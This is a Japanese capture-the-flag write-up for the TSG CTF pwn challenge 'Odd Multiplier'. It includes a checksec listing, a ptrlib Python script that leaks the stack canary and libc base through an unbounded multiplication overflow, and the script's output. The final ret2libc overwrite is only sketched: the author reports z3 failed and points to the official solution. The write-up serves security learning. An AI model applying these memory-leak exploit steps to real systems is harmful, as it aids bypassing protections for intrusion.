# [pwn 497pts] Odd Multiplier - TSG CTF
64ビットで全部有効です。
```
$ checksec -f multiplier
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   75 Symbols     Yes	0		2	multiplier
```

入力した奇数（1から255）を掛け算してくれるのですが、結果が桁溢れせず、いくらでも大きくなります。
適当に255をたくさん打てば分かるのですが、明らかにスタック上の値をリークできています。
これを利用してlibc baseとstack canaryが取りましょう。

```python
from ptrlib import *

libc = ELF("./libc-2.27.so")
sock = Process("./multiplier")

sock.recvline()

# leak canary
sock.recvline()
for i in range(25):
    sock.sendline("255")
sock.sendline("0")
canary = bytes.fromhex(bytes2str(sock.recvline().rstrip()[:-0x18 * 2]))
canary = u64(b'\x00' + canary[::-1][1:])
dump("canary = " + hex(canary))

# leak libc base
sock.recvline()
for i in range(41):
    sock.sendline("255")
sock.sendline("0")
addr_retaddr = bytes.fromhex(bytes2str(sock.recvline().rstrip()[:-0x28 * 2]))
addr_retaddr = u64(addr_retaddr[::-1])
libc_base = (addr_retaddr - libc.symbol("__libc_start_main")) & 0xfffffffffffff000
dump("libc base = " + hex(libc_base))
```

こんな感じで取れています。
```
$ python solve.py 
[+] Process: Successfully created new process (PID=19396)
[ptrlib] canary = 0x6b29ba2e172e1400
[ptrlib] libc base = 0x7ff4f0133000
```

あとはリターンアドレスを書き換えてret2libcすれば良いのですが、少し問題があります。
掛け算した結果が必ずcanaryとone gadgetを含む必要があるのですが、そのような値が奇数の積で表されるのでしょうか。
~~私はそんな都合の良いアルゴリズムは知らないのでwriteupを見ます。~~
※公式writeupを見ましたがコメントが一切書いてなくて何やってるか意味不明だったのでやっぱり自分で考えます。
まずはone gadgetとcanaryを分けて書き込むことにしました。
z3を試しましたがダメでした。



# 感想
面白かったです。
競技プログラミングとかやってる人はこういうアルゴリズムすぐ思い付くんだろうか。

# 参考文献
[1] [https://github.com/tsg-ut/tsgctf/blob/master/pwn/multiplier/writeup/solve.py](https://github.com/tsg-ut/tsgctf/blob/master/pwn/multiplier/writeup/solve.py)